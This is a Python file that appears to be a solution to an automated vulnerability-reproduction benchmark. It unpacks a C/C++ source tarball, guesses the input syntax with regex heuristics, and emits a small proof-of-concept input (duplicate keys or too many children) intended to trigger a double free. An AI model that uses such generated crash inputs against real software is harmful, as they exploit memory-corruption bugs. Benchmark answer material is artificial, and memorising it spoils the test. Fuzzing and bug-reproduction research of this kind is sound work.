import tarfile
import os
import shutil
import re
import tempfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        temp_dir = tempfile.mkdtemp()
        try:
            with tarfile.open(src_path) as tar:
                tar.extractall(path=temp_dir)
            
            content = ""
            for root, _, files in os.walk(temp_dir):
                for file in files:
                    if file.endswith(('.cpp', '.cc', '.c', '.h', '.hpp')):
                        with open(os.path.join(root, file), 'r', errors='ignore') as f:
                            content += f.read()
            
            # Syntax detection heuristics
            brace_cnt = len(re.findall(r"['\"]\{['\"]", content))
            paren_cnt = len(re.findall(r"['\"]\(", content))
            
            syntax = 'brace'
            if paren_cnt > brace_cnt + 2:
                syntax = 'lisp'
            elif 'json' in content.lower():
                syntax = 'json'
                
            # Logic detection
            # Default to duplicate trigger (common for Node::add exception causing double free)
            mode = 'duplicate'
            limit = 0
            
            # Check for limit if explicit throw on size is found
            m = re.search(r'(?:size|count)\s*\(\s*\)\s*>\s*(\d+)', content)
            if m:
                # Verify throw proximity
                idx = m.start()
                if 'throw' in content[idx:idx+300]:
                    mode = 'limit'
                    limit = int(m.group(1))
            
            # If "duplicate" or "exist" is explicitly mentioned, override limit
            # This confirms the "duplicate key" vector
            if "duplicate" in content.lower() or "exist" in content.lower():
                mode = 'duplicate'

            # Construct PoC
            if syntax == 'json':
                if mode == 'limit':
                    items = [b'1'] * (limit + 2)
                    return b'[' + b','.join(items) + b']'
                return b'{"a":1, "a":2}'
            
            elif syntax == 'lisp':
                if mode == 'limit':
                    items = b" ".join([b"(a)"] * (limit + 2))
                    return b"(r " + items + b")"
                return b"(r (a) (a))"
            
            else: # brace syntax (default)
                sep = b" "
                if len(re.findall(r"['\"];['\"]", content)) > 0:
                    sep = b"; "
                
                if mode == 'limit':
                    items = b""
                    for i in range(limit + 2):
                        items += b"n" + str(i).encode() + b" {}" + sep
                    return b"root { " + items + b"}"
                
                # Default duplicate PoC
                return b"root { a {}" + sep + b"a {}" + sep + b"}"

        except Exception:
            # Fallback if analysis fails
            return b"root { a {} a {} }"
        finally:
            shutil.rmtree(temp_dir)
